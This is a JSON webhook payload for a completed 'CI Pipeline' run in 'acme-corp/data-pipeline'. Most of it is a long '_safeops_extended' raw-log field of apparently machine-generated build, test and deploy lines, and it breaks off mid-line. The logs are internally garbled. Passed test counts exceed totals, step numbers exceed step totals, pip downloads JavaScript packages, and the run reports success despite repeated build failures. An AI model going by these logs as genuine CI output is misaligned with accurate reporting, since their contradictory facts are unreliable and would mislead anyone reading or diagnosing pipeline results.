{
  "action": "completed",
  "workflow_run": {
    "id": 703,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "dace443439d7c17f4353f8382160954124643064",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-12-03T12:19:37.847749Z",
    "updated_at": "2025-12-03T12:23:37.610610Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: deploy_staging ===\nHEAD is now at bf6e0c1\nNODE_ENV=development\nOK\nEnvironment: development\nUsing Python 3.9\nImage pulled successfully\n[12:19:37] INFO: Cache refreshed\npip: Downloading prettier-5.2.tar.gz\nStep 15/22: Running migrations\nReady.\nnpm notice: created a lockfile\nBundling main.css\nArtifact uploaded: dist.zip (13MB)\nException: NullPointerException\nSuccess!\npip: Installing build dependencies...\nPOST /data - 201 (251ms)\nWARNING: express has known vulnerabilities\nNODE_ENV=production\nOptimizing 57 modules...\nnpm install: resolved 1737 packages\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Downloading prettier-2.12.tar.gz\nTests: 184 passed, 255 total\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nFinished.\nStep 14/17: Building\nCompiling utils/service.java...\nCompleted.\nStep 12/24: Deploying\nnpm notice: created a lockfile\nCompleted.\nnpm install: added 137 packages\n[12:19:37] DEBUG: Query executed in 70ms\nCache saved successfully\n[12:19:37] INFO: Cache refreshed\nTests: 154 passed, 357 total\n\u2713 Task completed in 445ms\n[12:19:37] INFO: Processing request\n  PASS: integration/test_api_health.spec.js\n[12:19:37] DEBUG: Memory usage: 1547MB\nReady.\nStep 20/24: Linting\n[12:19:37] INFO: Connecting to database\nFAILED: test_user_create\nInstalling webpack@3.14.1\nCompiling lib/main.py...\nStep 19/17: Deploying\nCache invalidated: node_modules\nWARNING: react has known vulnerabilities\n\u2713 Step 'install' succeeded\nGET /status - 200 (93ms)\nCompiling src/handler.rs...\nTLS handshake completed\nTransforming 485 files...\nPlatform: darwin-arm64\nStep 12/22: Deploying\nLoading...\nImage pulled successfully\nLayer 3/8: ENV command\n\u2717 build failed with exit code 119\nCreating production build...\nCompleted.\nStep 14/22: Deploying\npip: Installing build dependencies...\nNODE_ENV=development\nHEAD is now at e2f60e6\n\u2713 All checks passed\nStep 18/20: Deploying\nRan 142 tests in 24s\nConnecting to cloud.services:443...\nStep 10/25: Linting\nStep 2/24: Installing dependencies\nTLS handshake completed\nGET /api - 204 (66ms)\n  PASS: test_cache_hit (477ms)\nBundling runtime.css\nReady.\n[12:19:37] WARN: Deprecated API usage\n  PASS: e2e/test_api_health.spec.js\nOptimizing 54 modules...\nTests: 425 passed, 232 total\nCompiling utils/service.java...\nFetching submodules...\nChecking out main branch\nBuilding Docker image...\nCompleted.\n[12:19:37] INFO: Connecting to database\nAlready up to date.\nWARNING: prettier has known vulnerabilities\n\u2713 Step 'build' succeeded\nStep 10/25: Building\nReady.\nOK\n=== Step deploy_staging completed ===\n=== Step: setup_node ===\nCreating production build...\nGET /health - 201 (7ms)\nWARNING: lodash has known vulnerabilities\nPOST /data - 202 (446ms)\nTransforming 222 files...\nStep 7/24: Testing\n[12:19:37] INFO: Connecting to database\nFetching submodules...\n[12:19:37] INFO: Cache refreshed\n\u2713 build completed\n\u2713 deploy completed\n[12:19:37] WARN: Deprecated API usage\nCache hit for key-2832\n[12:19:37] INFO: Request completed\nNODE_ENV=test\nChecking out master branch\nDone.\nCache miss for key-4440\n[12:19:37] INFO: Request completed\nTest Suites: 9 passed, 13 total\nOK\n\u2713 deploy completed\nCache hit for key-3573\nFinished.\nGenerating source maps...\nUsing Node.js 15.7.6\npip: Installing build dependencies...\n\u2713 Task completed in 2463ms\nAlready up to date.\nPushing to registry...\n[12:19:37] WARN: Deprecated API usage\nCompiling lib/main.py...\nSwitched to branch 'hotfix/task-955'\nUploading artifact 'build' (23 files)\n[12:19:37] INFO: Request completed\n\u2713 All checks passed\nLayer 4/12: COPY command\nnpm install: resolved 726 packages\nPulling image: python:18\nProcessing...\nTime: 97.643s\npip: Installing build dependencies...\nCache invalidated: node_modules\n[12:19:37] INFO: Cache refreshed\nStep 4/23: Running migrations\nChecking out main branch\n  PASS: e2e/test_cache_hit.spec.js\n\u2713 Step 'test' succeeded\npip: Installing build dependencies...\n[12:19:37] WARN: Deprecated API usage\nUploading artifact 'coverage' (1 files)\nFetching submodules...\nArtifact uploaded: build.tar.gz (44MB)\nCreating production build...\nLayer 1/11: ENV command\n[12:19:37] INFO: Starting build process\nConnection established\nUsing Python 3.12\nRan 136 tests in 23s\nOK\n[12:19:37] DEBUG: Connection pool: 13 active\n\u2713 All checks passed\npip: Installing build dependencies...\n[12:19:37] INFO: Cache refreshed\nPlatform: win32-x64\nConnecting to acme.corp:443...\nOptimizing 23 modules...\nnpm notice: package.json updated\nUsing Node.js 17.8.6\nNODE_ENV=production\nMinifying app.js\nInstalling jest@2.15.1\n  PASS: test_cache_hit (204ms)\nStep 6/25: Running migrations\nOptimizing 31 modules...\npip: Collecting jest\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:37] DEBUG: Memory usage: 1318MB\nStep 3/23: Linting\nInstalling eslint@1.20.9\nPOST /api - 200 (469ms)\n[12:19:37] INFO: Processing request\nnpm notice: package.json updated\npip install: Successfully installed prettier-4.17\nStep 10/20: Deploying\nNODE_ENV=development\nCache miss for key-3744\n[12:19:37] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2717 build failed with exit code 2\nCache restored successfully (205MB)\nConnection established\nAlready up to date.\nPushing to registry...\n=== Step setup_node completed ===\n=== Step: checkout ===\nConnection established\nnpm notice: package.json updated\nLayer 5/15: ENV command\n  PASS: integration/test_user_create.spec.js\nArtifact downloaded: 26MB\n[12:19:37] INFO: Request completed\nLoading...\nCoverage: 88% statements, 73% branches\nCompleted.\nFinished.\nCompiling src/utils.go...\nWaiting...\n\u2713 All checks passed\n  PASS: test_user_create (479ms)\nReady.\nnpm install: added 10 packages\nConnecting to cloud.services:443...\n[12:19:37] DEBUG: Initializing service\nSuccess!\nTransforming 489 files...\nPushing to registry...\n[12:19:37] DEBUG: Loading configuration\nLayer 7/14: ENV command\n[12:19:37] ERROR: Connection failed\nWARNING: jest has known vulnerabilities\nCache hit for key-5169\nPushing to registry...\npip: Installing build dependencies...\n\u2713 Task completed in 1434ms\n\u2713 Step 'checkout' succeeded\nArtifact uploaded: build.tar.gz (29MB)\nVerifying...\nVerifying...\npip: Downloading lodash-3.5.tar.gz\nChecking out main branch\n[12:19:37] INFO: Request completed\nSnapshots: 20 passed, 38 total\nStep 8/24: Testing\npip: Downloading axios-2.2.tar.gz\nTest Suites: 21 passed, 10 total\nyarn add: Done in 5.0s\nStep 5/20: Building\nSwitched to branch 'feature/task-323'\nStep 2/24: Running migrations\n[12:19:37] DEBUG: Loading configuration\nnpm notice: created a lockfile\nLoading...\nTests: 189 passed, 266 total\nLoading...\nNODE_ENV=production\nStep 4/17: Testing\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nException: TypeError\nGenerating source maps...\nWARNING: express has known vulnerabilities\nCache hit for key-5027\nCache hit for key-6649\n[12:19:37] WARN: Deprecated API usage\npip: Downloading axios-1.15.tar.gz\nPulling image: alpine:18\nGenerating source maps...\nProcessing...\nUploading artifact 'build' (5 files)\nOptimizing 64 modules...\npip: Collecting react\nStep 14/24: Testing\n  PASS: test_auth_login (16ms)\nGET /health - 201 (68ms)\n[12:19:37] INFO: Starting build process\nStep 9/18: Testing\nCompiling src/app.ts...\nPOST /api - 200 (359ms)\nPushing to registry...\nReady.\npip: Collecting react\nHEAD is now at 25fc7d7\nTime: 12.720s\nEnvironment: test\nDone.\nArtifact uploaded: build.tar.gz (48MB)\nConnection established\nArtifact uploaded: dist.zip (57MB)\nTLS handshake completed\n[12:19:37] WARN: Deprecated API usage\nCache restored successfully (86MB)\nInstalling react@5.18.1\nCompiling utils/handler.rs...\n[12:19:37] DEBUG: Initializing service\npip: Collecting prettier\nStep 9/25: Running migrations\nArtifact uploaded: dist.zip (91MB)\nStep 2/16: Installing dependencies\n[12:19:37] INFO: Request completed\nMinifying vendor.js\n=== Step checkout completed ===\n=== Step: build ===\nSwitched to branch 'hotfix/task-301'\nTest Suites: 8 passed, 23 total\npip install: Successfully installed prettier-3.10\nSnapshots: 33 passed, 26 total\n\u2713 Step 'build' succeeded\nTests: 325 passed, 257 total\n[12:19:37] DEBUG: Connection pool: 4 active\nPOST /data - 200 (62ms)\nTLS handshake completed\nStep 8/15: Building\n[12:19:37] INFO: Starting build process\nVerifying...\nFinished.\nnpm notice: package.json updated\nWARNING: react has known vulnerabilities\nException: TypeError\n[12:19:37] INFO: Processing request\nStep 17/15: Deploying\n[12:19:37] ERROR: Connection failed\nBuilding Docker image...\nDone.\nGenerating source maps...\nnpm notice: package.json updated\nTest Suites: 33 passed, 15 total\npip: Downloading react-5.19.tar.gz\npip: Collecting webpack\nAlready up to date.\nTime: 83.832s\nStep 16/15: Building\nCompiling src/main.py...\nWARNING: eslint has known vulnerabilities\nOptimizing 89 modules...\nFinished.\nnpm install: added 166 packages\nWARNING: webpack has known vulnerabilities\nChecking out develop branch\n[12:19:37] WARN: Deprecated API usage\nEnvironment: test\nFinished.\nCache hit for key-3931\n[12:19:37] ERROR: Connection failed\nCreating production build...\n[12:19:37] INFO: Processing request\n[12:19:37] INFO: Request completed\nSwitched to branch 'feature/task-559'\nTransforming 449 files...\n[12:19:37] DEBUG: Connection pool: 9 active\nCoverage: 85% statements, 79% branches\n[12:19:37] DEBUG: Query executed in 41ms\nOptimizing 94 modules...\nAlready up to date.\nPushing to registry...\nPOST /api - 200 (277ms)\nnpm install: added 416 packages\nCompiling src/app.ts...\nyarn add: Done in 22.40s\nCompiling components/utils.go...\nOK\nEnvironment: development\nStep 5/18: Installing dependencies\nOptimizing 42 modules...\nArtifact uploaded: build.tar.gz (9MB)\nPOST /upload - 202 (476ms)\n[12:19:37] DEBUG: Loading configuration\nnpm notice: created a lockfile\nFAILED: test_auth_login\nStep 18/20: Installing dependencies\n\u2713 Step 'checkout' succeeded\nBundling vendor.js\nCache restored successfully (366MB)\nAlready up to date.\nLayer 2/10: RUN command\npip: Installing build dependencies...\n\u2713 test completed\n[12:19:37] ERROR: Connection failed\n[12:19:37] DEBUG: Connection pool: 2 active\n[12:19:37] DEBUG: Initializing service\nnpm install: added 277 packages\nFinished.\nCompiling utils/index.js...\n\u2713 build completed\nDone.\nPOST /data - 200 (306ms)\nnpm install: resolved 1312 packages\nLoading...\nTransforming 365 files...\nWARNING: jest has known vulnerabilities\nnpm install: added 262 packages\n\u2713 test completed\nEnvironment: production\nCache hit for key-6224\nCompiling lib/handler.rs...\n[12:19:37] INFO: Processing request\nMinifying app.js\n=== Step build completed ===\n=== Step: integration_tests ===\nChecking out develop branch\nCache saved successfully\nTransforming 587 files...\nFAILED: test_api_health\nFinished.\nTests: 134 passed, 386 total\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:19:37] INFO: Request completed\nCreating production build...\nDone.\n[12:19:37] ERROR: Connection failed\nProcessing...\nMinifying app.js\n\u2713 validate completed\nCache restored successfully (361MB)\nCache saved successfully\n\u2713 Task completed in 2797ms\nVerifying...\nCompiling components/main.py...\nHEAD is now at a4814e1\nPOST /data - 200 (227ms)\nStep 1/19: Deploying\nCompleted.\nPOST /data - 201 (59ms)\nAlready up to date.\nLoading...\nPulling image: node:3.11\n[12:19:37] INFO: Starting build process\nArtifact downloaded: 18MB\nChecking out develop branch\nUsing Python 3.9\nCache restored successfully (416MB)\nOK\nCompleted.\nCache restored successfully (351MB)\nyarn add: Done in 13.53s\npip install: Successfully installed express-4.10\n\u2713 Step 'build' succeeded\n[12:19:37] DEBUG: Connection pool: 7 active\n[12:19:37] INFO: Processing request\n[12:19:37] DEBUG: Connection pool: 13 active\nConnecting to example.com:443...\nWARNING: prettier has known vulnerabilities\n[12:19:37] INFO: Starting build process\nWaiting...\nGET /api - 204 (27ms)\nPOST /upload - 202 (212ms)\nArtifact downloaded: 19MB\nChecking out master branch\n[12:19:37] ERROR: Connection failed\nConnecting to acme.corp:443...\nConnection established\nCache miss for key-5221\nTime: 24.253s\n  PASS: test_user_create (182ms)\nTLS handshake completed\n[12:19:37] DEBUG: Query executed in 85ms\nCache miss for key-9515\n[12:19:37] INFO: Starting build process\nBundling vendor.js\nCreating production build...\nFinished.\nnpm install: resolved 459 packages\nUsing Python 3.12\n[12:19:37] INFO: Cache refreshed\nStep 15/19: Testing\nArtifact uploaded: build.tar.gz (44MB)\npip install: Successfully installed jest-5.11\nRan 183 tests in 23s\nCache hit for key-7148\nCache saved successfully\n\u2717 build failed with exit code 95\nConnecting to acme.corp:443...\npip install: Successfully installed express-1.13\nFinished.\nRan 72 tests in 8s\nGET /api - 200 (75ms)\n\u2713 All checks passed\nEnvironment: test\nEnvironment: development\nSwitched to branch 'bugfix/task-356'\nTime: 64.681s\nCache saved successfully\nOptimizing 53 modules...\npip install: Successfully installed axios-2.14\nWaiting...\nCompiling src/handler.rs...\n[12:19:37] INFO: Cache refreshed\nFinished.\nStep 5/19: Running migrations\nCompiling src/main.py...\n[12:19:37] DEBUG: Initializing service\n[12:19:37] INFO: Request completed\n=== Step integration_tests completed ===\n=== Step: upload_artifacts ===\nTest Suites: 18 passed, 10 total\nLayer 5/14: COPY command\n[12:19:37] INFO: Starting build process\n\u2713 Task completed in 743ms\nFetching submodules...\nUploading artifact 'build' (38 files)\nSnapshots: 6 passed, 37 total\nProcessing...\nRan 17 tests in 44s\nFetching submodules...\n\u2713 Step 'setup' succeeded\npip: Collecting eslint\nWARNING: axios has known vulnerabilities\nCoverage: 82% statements, 69% branches\nHEAD is now at 9bb4ec3\npip: Collecting eslint\n\u2713 Task completed in 1948ms\nCompiling components/utils.go...\nOK\npip: Downloading axios-5.19.tar.gz\nCompiling utils/handler.rs...\nPOST /api - 200 (383ms)\n[12:19:37] DEBUG: Query executed in 55ms\nWARNING: axios has known vulnerabilities\nCompiling utils/service.java...\nConnecting to test.io:443...\n[12:19:37] INFO: Request completed\nPushing to registry...\n  PASS: integration/test_api_health.spec.js\n[12:19:37] WARN: Deprecated API usage\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nTLS handshake completed\nPulling image: node:latest\n[12:19:37] WARN: Deprecated API usage\nFetching submodules...\nFAILED: test_user_create\nOK\nWaiting...\nOptimizing 93 modules...\n\u2713 All checks passed\nTransforming 104 files...\nImage pulled successfully\nCompiling components/utils.go...\n[12:19:37] WARN: Deprecated API usage\nUsing Python 3.12\n\u2717 build failed with exit code 57\nWARNING: axios has known vulnerabilities\nCreating production build...\nCompiling components/utils.go...\nSwitched to branch 'bugfix/task-403'\nProcessing...\nTLS handshake completed\nOptimizing 23 modules...\nStep 9/22: Linting\n[12:19:37] ERROR: Connection failed\n\u2713 Task completed in 2174ms\nConnecting to cloud.services:443...\n\u2713 All checks passed\n[12:19:37] DEBUG: Memory usage: 1374MB\n[12:19:37] DEBUG: Initializing service\n[12:19:37] INFO: Connecting to database\nArtifact uploaded: dist.zip (43MB)\nnpm install: resolved 794 packages\nCompiling lib/handler.rs...\nnpm install: added 241 packages\nNODE_ENV=test\nCache hit for key-3351\nTransforming 151 files...\nCache invalidated: dependencies\nCompiling utils/index.js...\nTransforming 240 files...\nFAILED: test_api_health\nLoading...\nPlatform: win32-x64\n\u2713 All checks passed\nMinifying app.js\nProcessing...\nPOST /api - 200 (401ms)\nPushing to registry...\nCache invalidated: build\n[12:19:37] INFO: Cache refreshed\npip: Installing build dependencies...\nChecking out main branch\nChecking out develop branch\nCache miss for key-4193\nImage pulled successfully\nnpm notice: package.json updated\nInstalling jest@5.16.5\n[12:19:37] INFO: Request completed\nFetching submodules...\nFetching submodules...\n\u2713 Task completed in 1871ms\nCreating production build...\n=== Step upload_artifacts completed ===\n=== Step: setup_environment ===\nDone.\nTransforming 926 files...\n[12:19:37] DEBUG: Connection pool: 3 active\npip: Downloading eslint-5.13.tar.gz\n[12:19:37] ERROR: Connection failed\nStep 18/16: Testing\nUsing Python 3.10\nHEAD is now at 875349b\nDone.\nWARNING: webpack has known vulnerabilities\nHEAD is now at 07f7f45\nArtifact uploaded: build.tar.gz (38MB)\nTests: 334 passed, 476 total\nPushing to registry...\n[12:19:37] DEBUG: Query executed in 86ms\nTLS handshake completed\nSuccess!\nTime: 3.445s\nWARNING: lodash has known vulnerabilities\nWARNING: prettier has known vulnerabilities\nTest Suites: 38 passed, 9 total\nTests: 266 passed, 448 total\nTLS handshake completed\nTime: 49.63s\nArtifact uploaded: dist.zip (94MB)\nOptimizing 34 modules...\nPushing to registry...\nAlready up to date.\nGenerating source maps...\nUploading artifact 'dist' (42 files)\nFetching submodules...\nWARNING: lodash has known vulnerabilities\nFetching submodules...\nTime: 31.777s\n[12:19:37] INFO: Starting build process\nSwitched to branch 'bugfix/task-833'\nPOST /data - 200 (459ms)\nnpm notice: created a lockfile\nConnection established\nStep 12/21: Testing\nCompleted.\nStep 8/25: Testing\nCache invalidated: build\nConnecting to test.io:443...\nCompiling src/main.py...\nnpm notice: created a lockfile\n[12:19:37] WARN: Deprecated API usage\nNODE_ENV=test\nCache miss for key-4255\n[12:19:37] INFO: Starting build process\n[12:19:37] INFO: Connecting to database\nnpm notice: created a lockfile\n  PASS: unit/test_auth_login.spec.js\nPlatform: darwin-arm64\nGenerating source maps...\nArtifact uploaded: build.tar.gz (38MB)\nStep 11/16: Linting\nCache hit for key-4983\nTLS handshake completed\n[12:19:37] DEBUG: Memory usage: 180MB\nCompleted.\nStep 4/21: Testing\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWaiting...\n[12:19:37] DEBUG: Loading configuration\n  PASS: integration/test_user_create.spec.js\nCompleted.\nStep 6/21: Testing\nMinifying app.js\nStep 18/19: Linting\nnpm install: resolved 1352 packages\nStep 17/16: Deploying\n[12:19:37] WARN: Deprecated API usage\npip: Downloading webpack-5.17.tar.gz\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (9MB)\npip: Installing build dependencies...\nWARNING: axios has known vulnerabilities\n[12:19:37] DEBUG: Connection pool: 11 active\nWaiting...\nTime: 51.928s\n\u2717 build failed with exit code 20\nnpm notice: package.json updated\nReady.\nUsing Node.js 17.9.6\nCompiling utils/main.py...\nTransforming 310 files...\nnpm notice: created a lockfile\n[12:19:37] INFO: Request completed\n[12:19:37] INFO: Request completed\nCompiling utils/app.ts...\nTest Suites: 11 passed, 30 total\n[12:19:37] ERROR: Connection failed\nCache invalidated: build\n=== Step setup_environment completed ===\n=== Step: save_cache ===\n  PASS: test_db_connect (477ms)\nLayer 1/13: RUN command\nReady.\nnpm notice: package.json updated\nPOST /upload - 201 (318ms)\nSnapshots: 1 passed, 25 total\nStep 6/23: Testing\n[12:19:37] DEBUG: Connection pool: 19 active\nUploading artifact 'build' (16 files)\n\u2713 Task completed in 2378ms\nSuccess!\nPOST /api - 202 (181ms)\nUploading artifact 'build' (39 files)\nHEAD is now at 9d76c8a\nCache restored successfully (124MB)\n[12:19:37] ERROR: Connection failed\npip: Downloading jest-2.7.tar.gz\n[12:19:37] ERROR: Connection failed\nOptimizing 78 modules...\nUploading artifact 'coverage' (22 files)\n[12:19:37] INFO: Request completed\npip: Installing build dependencies...\nWaiting...\n[12:19:37] WARN: Deprecated API usage\nCompiling utils/main.py...\nTest Suites: 20 passed, 38 total\nPlatform: win32-x64\nArtifact uploaded: dist.zip (36MB)\n[12:19:37] INFO: Cache refreshed\n\u2713 Task completed in 1020ms\npip: Downloading prettier-1.1.tar.gz\n[12:19:37] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-296'\n\u2713 Task completed in 3083ms\nEnvironment: test\nWaiting...\nNODE_ENV=development\nCoverage: 87% statements, 85% branches\n[12:19:37] WARN: Deprecated API usage\nVerifying...\nOptimizing 62 modules...\nCoverage: 87% statements, 69% branches\nUsing Node.js 19.6.2\nInstalling lodash@3.3.10\n\u2713 Step 'test' succeeded\nTLS handshake completed\n[12:19:37] INFO: Starting build process\nStep 4/21: Running migrations\n[12:19:37] DEBUG: Memory usage: 1575MB\nCoverage: 89% statements, 78% branches\nCoverage: 75% statements, 84% branches\n[12:19:37] WARN: Deprecated API usage\nCompiling lib/index.js...\nStep 2/16: Deploying\nUsing Node.js 19.7.8\npip install: Successfully installed axios-4.3\nStep 10/16: Running migrations\nStep 8/21: Running migrations\nMinifying app.js\nStep 13/17: Deploying\nTLS handshake completed\n  PASS: test_cache_hit (72ms)\nCompiling lib/handler.rs...\nnpm install: added 415 packages\nLoading...\nException: TypeError\nImage pulled successfully\nLoading...\nEnvironment: test\nPOST /api - 202 (386ms)\nMinifying vendor.js\nPOST /api - 200 (208ms)\n[12:19:37] DEBUG: Loading configuration\nWARNING: jest has known vulnerabilities\nCache restored successfully (53MB)\nStep 13/17: Installing dependencies\nUsing Python 3.10\nCompiling lib/handler.rs...\nUsing Node.js 15.10.10\nFinished.\nUsing Node.js 17.7.4\n[12:19:37] WARN: Deprecated API usage\nPOST /api - 202 (202ms)\n  PASS: e2e/test_cache_hit.spec.js\nCache miss for key-2610\nSnapshots: 37 passed, 15 total\nVerifying...\n\u2713 Step 'build' succeeded\nCompiling utils/utils.go...\nImage pulled successfully\nException: TypeError\n[12:19:37] DEBUG: Memory usage: 381MB\nCompleted.\nProcessing...\n=== Step save_cache completed ===\n=== Step: lint ===\nImage pulled successfully\n\u2713 All checks passed\nnpm notice: created a lockfile\nMinifying app.js\nSwitched to branch 'feature/task-301'\nPlatform: linux-x64\nSwitched to branch 'feature/task-500'\nWaiting...\nMinifying vendor.js\nStep 5/21: Linting\nTime: 66.671s\nGET /status - 200 (10ms)\n[12:19:37] WARN: Deprecated API usage\nTest Suites: 29 passed, 28 total\nCreating production build...\nArtifact uploaded: build.tar.gz (3MB)\nCache restored successfully (194MB)\npip install: Successfully installed webpack-3.1\nCache hit for key-3910\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nPlatform: linux-x64\nStep 18/22: Building\nWARNING: axios has known vulnerabilities\n  PASS: e2e/test_auth_login.spec.js\nArtifact uploaded: build.tar.gz (18MB)\nStep 20/17: Testing\nConnecting to test.io:443...\npip: Downloading webpack-2.20.tar.gz\nArtifact uploaded: dist.zip (56MB)\nArtifact downloaded: 22MB\n[12:19:37] INFO: Cache refreshed\nStep 10/24: Testing\n[12:19:37] DEBUG: Memory usage: 1497MB\npip: Installing build dependencies...\nTest Suites: 50 passed, 8 total\nCompiling components/utils.go...\npip: Collecting eslint\nFinished.\nnpm notice: created a lockfile\n[12:19:37] ERROR: Connection failed\nStep 15/21: Running migrations\nTLS handshake completed\nVerifying...\nTest Suites: 33 passed, 27 total\nPushing to registry...\nWaiting...\nWARNING: axios has known vulnerabilities\nSuccess!\n[12:19:37] DEBUG: Initializing service\nCache saved successfully\n  PASS: unit/test_db_connect.spec.js\nStep 16/24: Running migrations\nStep 1/18: Testing\nStep 10/22: Testing\nPushing to registry...\nArtifact downloaded: 44MB\n[12:19:37] WARN: Deprecated API usage\nCompiling components/service.java...\nCompiling utils/handler.rs...\npip: Collecting express\nnpm notice: created a lockfile\nReady.\nNODE_ENV=development\nHEAD is now at a713200\n[12:19:37] DEBUG: Memory usage: 1226MB\nStep 10/25: Running migrations\nWARNING: webpack has known vulnerabilities\n\u2713 Step 'install' succeeded\nVerifying...\nCache restored successfully (361MB)\nGET /status - 200 (9ms)\nStep 13/16: Building\n[12:19:37] INFO: Processing request\nVerifying...\nyarn add: Done in 7.64s\nTime: 17.552s\nFinished.\nPlatform: darwin-arm64\nInstalling webpack@1.1.7\n[12:19:37] INFO: Processing request\nSuccess!\nCache hit for key-7982\nBuilding Docker image...\nMinifying app.js\n  PASS: integration/test_api_health.spec.js\nArtifact uploaded: dist.zip (86MB)\nBuilding Docker image...\n[12:19:37] INFO: Cache refreshed\nTime: 64.261s\nInstalling jest@3.2.10\nArtifact uploaded: build.tar.gz (23MB)\nPOST /api - 202 (75ms)\nnpm install: resolved 360 packages\nVerifying...\n=== Step lint completed ===\n=== Step: type_check ===\nProcessing...\nCache saved successfully\nWaiting...\n[12:19:37] INFO: Cache refreshed\nnpm install: resolved 223 packages\n[12:19:37] DEBUG: Loading configuration\n[12:19:37] INFO: Cache refreshed\nGenerating source maps...\nException: RuntimeError\n\u2713 Step 'setup' succeeded\nCache restored successfully (39MB)\nnpm notice: package.json updated\n[12:19:37] DEBUG: Loading configuration\nCache hit for key-3419\n[12:19:37] INFO: Request completed\nVerifying...\nProcessing...\nRan 38 tests in 30s\nDone.\nSwitched to branch 'bugfix/task-888'\nCreating production build...\nConnecting to example.com:443...\nStep 17/24: Building\nTransforming 497 files...\nMinifying vendor.js\nStep 18/15: Installing dependencies\nCache hit for key-3343\nTransforming 238 files...\npip: Downloading lodash-1.7.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip install: Successfully installed axios-1.20\nWaiting...\nStep 13/19: Linting\nnpm install: added 92 packages\nnpm install: added 451 packages\nUploading artifact 'build' (19 files)\nOptimizing 39 modules...\n  PASS: unit/test_user_create.spec.js\nCompiling src/handler.rs...\nStep 5/17: Testing\nImage pulled successfully\npip: Installing build dependencies...\nCache hit for key-5837\nUploading artifact 'dist' (39 files)\nHEAD is now at 55b2e00\nWARNING: react has known vulnerabilities\nWaiting...\nLayer 6/10: RUN command\n  PASS: test_cache_hit (235ms)\n  PASS: integration/test_user_create.spec.js\nImage pulled successfully\nArtifact uploaded: dist.zip (19MB)\nSnapshots: 34 passed, 34 total\nPlatform: win32-x64\n\u2713 Step 'install' succeeded\nCache restored successfully (235MB)\nTests: 107 passed, 208 total\nWARNING: jest has known vulnerabilities\n[12:19:37] INFO: Processing request\nUploading artifact 'build' (9 files)\n[12:19:37] INFO: Starting build process\nArtifact uploaded: build.tar.gz (35MB)\nMinifying app.js\nUploading artifact 'coverage' (41 files)\nChecking out develop branch\nLoading...\nStep 14/21: Running migrations\nUploading artifact 'dist' (45 files)\nChecking out main branch\n[12:19:37] INFO: Request completed\n[12:19:37] INFO: Starting build process\nnpm install: added 431 packages\n[12:19:37] INFO: Cache refreshed\npip: Downloading prettier-5.0.tar.gz\nEnvironment: staging\nConnection established\nProcessing...\nReady.\nCache miss for key-8387\n[12:19:37] INFO: Starting build process\nWARNING: jest has known vulnerabilities\nCache hit for key-9098\n[12:19:37] DEBUG: Memory usage: 150MB\nCompiling utils/service.java...\nReady.\nReady.\n[12:19:37] INFO: Connecting to database\npip install: Successfully installed express-2.10\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:19:37] DEBUG: Initializing service\nBuilding Docker image...\nHEAD is now at 9f81eae\nOK\nCompleted.\n=== Step type_check completed ===\n=== Step: restore_cache ===\nUsing Python 3.10\n\u2713 Step 'checkout' succeeded\nConnection established\nArtifact downloaded: 30MB\nCompiling lib/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nChecking out master branch\nVerifying...\n[12:19:37] WARN: Deprecated API usage\nStep 13/24: Linting\nCompiling lib/service.java...\nReady.\nnpm notice: created a lockfile\nCache hit for key-9736\nWARNING: jest has known vulnerabilities\nUploading artifact 'build' (26 files)\nBundling runtime.css\n\u2713 deploy completed\nHEAD is now at 6f10407\nCompiling src/service.java...\nArtifact uploaded: dist.zip (96MB)\nTransforming 258 files...\nSnapshots: 3 passed, 3 total\nInstalling react@1.3.2\n\u2713 build completed\n  PASS: unit/test_db_connect.spec.js\nConnecting to example.com:443...\nRan 198 tests in 42s\n  PASS: test_user_create (417ms)\nCompiling utils/utils.go...\nyarn add: Done in 24.41s\n[12:19:37] WARN: Deprecated API usage\nnpm install: added 290 packages\nSuccess!\n[12:19:37] DEBUG: Memory usage: 634MB\nUsing Python 3.10\nnpm install: resolved 185 packages\n[12:19:37] INFO: Processing request\nBundling styles.js\n[12:19:37] WARN: Deprecated API usage\nMinifying main.js\nnpm notice: package.json updated\n\u2713 Step 'checkout' succeeded\nPushing to registry...\nCache saved successfully\nArtifact uploaded: build.tar.gz (42MB)\nImage pulled successfully\n  PASS: test_user_create (73ms)\n  PASS: test_user_create (129ms)\npip install: Successfully installed jest-3.2\nStep 18/21: Testing\nDone.\nTest Suites: 24 passed, 35 total\nTest Suites: 31 passed, 35 total\n[12:19:37] INFO: Request completed\nUploading artifact 'coverage' (29 files)\nBundling styles.css\nSwitched to branch 'feature/task-697'\n\u2713 Task completed in 3227ms\nArtifact uploaded: build.tar.gz (16MB)\nCache invalidated: dependencies\nReady.\n[12:19:37] INFO: Connecting to database\nPulling image: alpine:3.11\nStep 3/24: Deploying\nyarn add: Done in 19.92s\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPushing to registry...\nCompiling lib/utils.go...\n\u2713 All checks passed\n\u2713 deploy completed\n\u2713 deploy completed\nOptimizing 61 modules...\n  PASS: e2e/test_auth_login.spec.js\n\u2717 build failed with exit code 99\nMinifying vendor.js\nConnection established\nCompleted.\nUploading artifact 'build' (27 files)\n\u2713 package completed\nCoverage: 96% statements, 99% branches\nCoverage: 85% statements, 95% branches\nCompiling src/service.java...\nConnection established\nCache invalidated: node_modules\nArtifact uploaded: build.tar.gz (32MB)\nEnvironment: staging\nSwitched to branch 'feature/task-681'\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nException: TypeError\nStep 15/23: Building\nPOST /upload - 201 (290ms)\nCompleted.\nSnapshots: 23 passed, 1 total\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\nBuilding Docker image...\nNODE_ENV=development\npip: Downloading 